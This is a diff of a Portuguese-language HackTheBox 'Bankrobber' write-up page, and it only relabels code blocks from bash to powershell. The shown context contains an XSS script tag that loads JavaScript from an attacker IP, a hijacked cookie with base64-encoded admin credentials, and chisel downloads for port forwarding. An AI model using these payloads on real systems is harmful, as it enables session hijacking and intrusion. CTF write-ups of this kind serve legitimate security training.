@@ -213,7 +213,7 @@
 <pre><code class="language-html">&lt;script src=&quot;http://10.10.14.9/test.js&quot;&gt;&lt;/script&gt;
 </code></pre>
 <p>Esse código faz com que, se existir a tal vulnerabilidade, o browser por onde o administrador simulado abre a transação, execute esse código javascript, que por sua vez tenta adquirir um outro ficheiro denominado test.js localizado em http://10.10.14.9/. É claro que para verificar se o código é executado, é necessário disponibilizar este serviço http:</p>
-<pre><code class="language-bash">sudo python3 -m http.server 80
+<pre><code class="language-powershell">sudo python3 -m http.server 80
 #&gt;  10.10.10.154 - - [13/Sep/2021 12:12:58] code 404, message File not found
 #&gt;  10.10.10.154 - - [13/Sep/2021 12:12:58] &quot;GET /test.js HTTP/1.1&quot; 404 -
 </code></pre>
@@ -227,7 +227,7 @@ request.send()
 </code></pre>
 <p><img src="Assets/HTB-Windows-Insane-Bankrobber/cookie_hijack.png" alt="Cookie hijack" /></p>
 <p>Na imagem, é possível ver o cookie de um usuário (supostamente administrador pelo que o alerta nos informou). Esse cookie está &quot;encoded&quot;. Primeiro podemos reverter o &quot;urlencoded&quot; com ajuda do php em modo interativo. O resultado é o seguinte:</p>
-<pre><code class="language-bash">username=YWRtaW4=; password=SG9wZWxlc3Nyb21hbnRpYw==; id=1
+<pre><code class="language-powershell">username=YWRtaW4=; password=SG9wZWxlc3Nyb21hbnRpYw==; id=1
 </code></pre>
 <p>Isto não é o username e password em texto claro. Mas pelo formato, é facilmente identificável. Vamos tentar descodificar:</p>
 <p><img src="Assets/HTB-Windows-Insane-Bankrobber/admin_credenciais.png" alt="Credenciais do administrador" /></p>
@@ -334,7 +334,7 @@ request.send(params)
 <p>Para ser mais comodo, vou fazer um PortForwarding desta porta 910 para a minha porta 910 da minha máquiina kali.</p>
 <p>Para isso, irei utilizar o chisel do jpillora (https://github.com/jpillora/chisel/releases)</p>
 <p>Enviar o chisel windows para a máquina alvo, e guarda a versão linux na minha máquina</p>
-<pre><code class="language-bash">wget https://github.com/jpillora/chisel/releases/download/v1.7.6/chisel_1.7.6_linux_amd64.gz
+<pre><code class="language-powershell">wget https://github.com/jpillora/chisel/releases/download/v1.7.6/chisel_1.7.6_linux_amd64.gz
 wget https://github.com/jpillora/chisel/releases/download/v1.7.6/chisel_1.7.6_windows_amd64.gz
 
 mv chisel_1.7.6_linux_amd64.gz chisel.elf.gz
